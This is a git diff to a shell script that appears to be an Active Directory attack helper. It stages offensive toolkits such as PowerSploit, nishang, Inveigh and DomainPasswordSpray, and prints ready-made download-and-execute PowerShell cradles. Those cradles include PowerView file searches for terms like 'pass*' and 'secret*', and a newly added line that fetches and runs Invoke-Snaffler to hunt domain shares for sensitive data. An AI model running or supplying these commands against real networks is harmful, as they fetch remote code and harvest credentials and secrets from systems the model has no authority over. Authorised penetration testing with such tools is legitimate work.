@@ -335,7 +335,7 @@ cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/PowerSharpPack/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/PowerSharpPack/PowerSharpBinaries/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Inveigh/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
@@ -1933,6 +1933,9 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinde
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -OfficeDocs"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Include *.ps1,*.bak,*.vbs,*.config,*.conf"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Terms account*,pass*,secret*,conf*,test*,salar*"
+echo -e ""
+echo -e "${IBLUE}Snaffler${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -Command "\"-s -d Domain.local -o snaffler.log -v data"\""
 echo -e ""
 echo -e ""
 
